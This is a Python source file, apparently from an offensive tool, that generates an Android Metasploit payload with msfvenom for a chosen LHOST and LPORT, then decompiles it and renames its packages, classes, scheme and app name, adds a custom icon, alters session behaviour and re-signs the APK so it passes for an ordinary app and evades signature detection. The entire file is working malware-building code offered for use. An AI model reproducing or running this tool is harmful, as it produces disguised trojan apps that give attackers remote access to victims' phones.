#!/usr/bin/env python3

import fileinput
import os
import os.path
from PIL import Image
import random
import shutil
import string
import sys
import subprocess
from time import sleep


class ApkBleach:

    def __init__(self, *args):
        self.user = args[0]
        self.payload = args[1]
        self.lhost = args[2]
        self.lport = args[3]
        self.session_count = args[4]
        self.icon_file = args[5]
        self.app_name = args[6]
        self.app = args[6].replace(" ", "") + ".apk"

        os.mkdir(f"res/cache/{self.user}")

        self.payload_dir = f"res/cache/{self.user}"

        letters = string.ascii_lowercase
        self.m_smali_dir = ''.join(random.choice(letters) for i in range(8))
        self.s_smali_dir = ''.join(random.choice(letters) for i in range(8))
        self.main_activity = ''.join(random.choice(letters) for i in range(8))
        self.main_service = ''.join(random.choice(letters) for i in range(8))
        self.main_broadcast_receiver = ''.join(
            random.choice(letters) for i in range(8))
        self.p_smali_file = ''.join(random.choice(letters) for i in range(8))
        self.scheme = ''.join(random.choice(letters) for i in range(8))

    def generate_payload(self):
        self.payload_path = f"{self.payload_dir}/{self.user}.apk"

        subprocess.call(
            ['bash', '-c',
             f"msfvenom -p {self.payload} LHOST={self.lhost} LPORT={self.lport} --platform android -a dalvik --pad-nops -f raw -o {self.payload_path} &>/dev/null"]
        )

        if not os.path.isfile(self.payload_path):
            return False
        else:
            self.decompiled_path = f"{self.payload_dir}/decompiled"
            return True

    def decompile_apk(self):
        subprocess.call(
            ['bash', '-c', f'apktool -q -f d {self.payload_path} -o {self.decompiled_path} &>/dev/null'])

    def delete_permissions(self, permissions): 
        # reading in the lines of the manifest file
        with open(f'{self.decompiled_path}/AndroidManifest.xml', 'r') as manifest:
            manifest_lines = manifest.readlines()

        # Removing any duplicate entries. For some reason metasploit generates this payload with a 
        # duplicate entry of the RECORD_AUDIO permission
        with open(f'{self.decompiled_path}/AndroidManifest.xml', 'w') as manifest:
            lines_seen = set()
            for line in manifest_lines:
                if line in lines_seen and "intent-filter" in line or line not in lines_seen:
                    manifest.write(line)
                lines_seen.add(line)

        # Removing the permission selected
        for line in manifest_lines:
            for permission in permissions:
                if permission in line:
                    for edit_line in fileinput.input([f'{self.decompiled_path}/AndroidManifest.xml'], inplace=True):
                        print(edit_line.replace(line, ''), end='')

    def bleach_apk(self):
        if self.icon_file:
            for line in fileinput.input([f'{self.decompiled_path}/AndroidManifest.xml'], inplace=True):
                print(line.replace(
                    '<application android:label=\"@string/app_name\">',
                    '<application android:label=\"@string/app_name\" android:icon=\"@drawable/icon\" >'
                ), end='')

            icon_folders = [
                "drawable-ldpi-v4",
                "drawable-mdpi-v4",
                "drawable-hdpi-v4"
            ]

            for folder in icon_folders:
                os.mkdir(f"{self.decompiled_path}/res/{folder}")

            icon_to_inject = Image.open(self.icon_file)

            ldpi = icon_to_inject.resize((36, 36))
            mdpi = icon_to_inject.resize((48, 48))
            hdpi = icon_to_inject.resize((72, 72))

            ldpi.save(f'{self.decompiled_path}/res/drawable-ldpi-v4/icon.png')
            mdpi.save(f'{self.decompiled_path}/res/drawable-mdpi-v4/icon.png')
            hdpi.save(f'{self.decompiled_path}/res/drawable-hdpi-v4/icon.png')

        if self.session_count:

            os.remove(
                f'{self.decompiled_path}/smali/com/metasploit/stage/MainActivity.smali')

            shutil.copyfile('res/stealth/MainActivity.smali',
                            f'{self.decompiled_path}/smali/com/metasploit/stage/MainActivity.smali')

            for edit_line in fileinput.input([f'{self.decompiled_path}/smali/com/metasploit/stage/MainActivity.smali'], inplace=True):
                print(edit_line.replace(
                    'iget v0, p0, Lcom/metasploit/stage/MainActivity;->ran:I',
                    f'iget v0, p0, Lcom/metasploit/stage/MainActivity;->ran:I\n\n\tconst/4 v1, 0x{int(self.session_count)}'),
                    end=''
                )

        # platformBuildVersionCode="10"/platformBuildVersionCode="27"/g;s/
        # platformBuildVersionName=\"2.3.3\"/platformBuildVersionName=\"8.1.0\"/g" 

        for edit_line in fileinput.input([f'{self.decompiled_path}/AndroidManifest.xml'], inplace=True):
            print(edit_line.replace('platformBuildVersionCode=\"10\"',
                                    f'platformBuildVersionCode=\"27\"'), end='')

        for edit_line in fileinput.input([f'{self.decompiled_path}/AndroidManifest.xml'], inplace=True):
            print(edit_line.replace('platformBuildVersionName=\"2.3.3\"',
                                    f'platformBuildVersionName=\"8.1.0\"'), end='')

        # Changing the apps name to what user provided
        for edit_line in fileinput.input([f'{self.decompiled_path}/res/values/strings.xml'], inplace=True):
            print(edit_line.replace('MainActivity',
                                    f'{self.app_name}'), end='')

        # Change package path in manifest
        for edit_line in fileinput.input([f'{self.decompiled_path}/AndroidManifest.xml'], inplace=True):
            print(edit_line.replace('com.metasploit.stage',
                                    f'com.{self.m_smali_dir}.{self.s_smali_dir}'), end='')

        # change Scheme in manifest
        for edit_line in fileinput.input([f'{self.decompiled_path}/AndroidManifest.xml'], inplace=True):
            print(edit_line.replace('android:scheme=\"metasploit\"',
                                    f'android:scheme=\"{self.scheme}\"'), end='')

        # change MainActivity name in manifest
        for edit_line in fileinput.input([f'{self.decompiled_path}/AndroidManifest.xml'], inplace=True):
            print(edit_line.replace('MainActivity',
                                    f'{self.main_activity}'), end='')

        # change MainService name in manifest
        for edit_line in fileinput.input([f'{self.decompiled_path}/AndroidManifest.xml'], inplace=True):
            print(edit_line.replace('MainService',
                                    f'{self.main_service}'), end='')

        # change MainBroadcastReceiver name in manifest
        for edit_line in fileinput.input([f'{self.decompiled_path}/AndroidManifest.xml'], inplace=True):
            print(edit_line.replace('MainBroadcastReceiver',
                                    f'{self.main_broadcast_receiver}'), end='')

        # Renaming apk directories
        os.rename(rf'{self.decompiled_path}/smali/com/metasploit',
                  rf'{self.decompiled_path}/smali/com/{self.m_smali_dir}')
        os.rename(rf'{self.decompiled_path}/smali/com/{self.m_smali_dir}/stage',
                  rf'{self.decompiled_path}/smali/com/{self.m_smali_dir}/{self.s_smali_dir}')

        p_files_path = f"{self.decompiled_path}/smali/com/{self.m_smali_dir}/{self.s_smali_dir}"

        # Renaming payload files named MainActivity.smali, MainBroadcastReceier.smali, MainService.smali, Payload.smali
        os.rename(rf'{p_files_path}/MainActivity.smali',
                  rf'{p_files_path}/{self.main_activity}.smali')
        os.rename(rf'{p_files_path}/MainBroadcastReceiver.smali',
                  rf'{p_files_path}/{self.main_broadcast_receiver}.smali')
        os.rename(rf'{p_files_path}/MainService.smali',
                  rf'{p_files_path}/{self.main_service}.smali')
        os.rename(rf'{p_files_path}/Payload.smali',
                  rf'{p_files_path}/{self.p_smali_file}.smali')

        # Changing referances of metasploit, stage, MainActivity, MainService, MainBroadcastReceiver, Payload in all payload files
        for file in os.listdir(p_files_path):
            for edit_line in fileinput.input([f'{p_files_path}/{file}'], inplace=True):
                print(edit_line.replace('metasploit',
                                        f'{self.m_smali_dir}'), end='')

            for edit_line in fileinput.input([f'{p_files_path}/{file}'], inplace=True):
                print(edit_line.replace(
                    'stage', f'{self.s_smali_dir}'), end='')

            for edit_line in fileinput.input([f'{p_files_path}/{file}'], inplace=True):
                print(edit_line.replace('MainActivity',
                                        f'{self.main_activity}'), end='')

            for edit_line in fileinput.input([f'{p_files_path}/{file}'], inplace=True):
                print(edit_line.replace('MainService',
                                        f'{self.main_service}'), end='')

            for edit_line in fileinput.input([f'{p_files_path}/{file}'], inplace=True):
                print(edit_line.replace('MainBroadcastReceiver',
                                        f'{self.main_broadcast_receiver}'), end='')

            for edit_line in fileinput.input([f'{p_files_path}/{file}'], inplace=True):
                print(edit_line.replace(
                    'Payload', f'{self.p_smali_file}'), end='')

    def rebuild_apk(self):
        subprocess.call(
            ['bash', '-c', f'apktool -q b {self.decompiled_path} -o {self.payload_dir}/compiled.apk &>/dev/null'])
        subprocess.call(
            ['bash', '-c', f'yes "yes" | keytool -genkey -v -keystore {self.payload_dir}/{self.app}.keystore -alias {self.app} -keyalg RSA -storepass password -keysize 2048 -keypass password -validity 10000 &>/dev/null'])
        subprocess.call(
            ['bash', '-c', f'jarsigner -sigalg SHA1withRSA -digestalg SHA1 -storepass password -keypass password -keystore {self.payload_dir}/{self.app}.keystore {self.payload_dir}/compiled.apk {self.app} &>/dev/null'])
        subprocess.call(
            ['bash', '-c', f'zipalign -f 4 {self.payload_dir}/compiled.apk {self.payload_dir}/{self.app}'])

        payload = f"{self.payload_dir}/{self.app}"

        return payload
